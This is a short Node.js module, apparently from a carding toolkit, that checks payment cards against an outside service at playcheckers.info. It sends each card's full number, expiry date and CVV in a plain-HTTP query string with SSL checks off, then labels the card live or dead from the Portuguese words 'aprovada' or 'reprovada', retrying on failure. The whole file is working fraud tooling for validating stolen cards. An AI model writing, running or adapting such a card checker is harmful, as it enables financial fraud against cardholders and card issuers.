const { getConfig } = require('../../configManager')
const request = require('request-promise')

module.exports = async function playercheckers(
  card,
  currentRetry = 0
) {
  const { retrys, playcheckers: configs } = getConfig('checkers')

  try {
    const options = {
      url: `http://playcheckers.info/check?info=${card.number}|${card.month}|${card.year}|${card.cvv}&user=${configs.token}`,
      method: 'GET',
      followAllRedirects: true,
      strictSSL: false,
      timeout: 120000,
    }

    if (currentRetry >= retrys)
      return {
        active: false,
        output: 'Error on call api',
      }

    const result = await request(options)

    if (result?.toLowerCase?.()?.includes('aprovada')) {
      return {
        active: true,
        card: card,
        live: true,
        output: result,
      }
    } else if (result?.toLowerCase?.()?.includes('reprovada')) {
      return {
        active: true,
        card: card,
        live: false,
        output: result,
      }
    } else {
      currentRetry++
      return playercheckers(card, currentRetry)
    }
  } catch (e) {
    console.log(e)

    currentRetry++
    return playercheckers(card, currentRetry)
  }
}
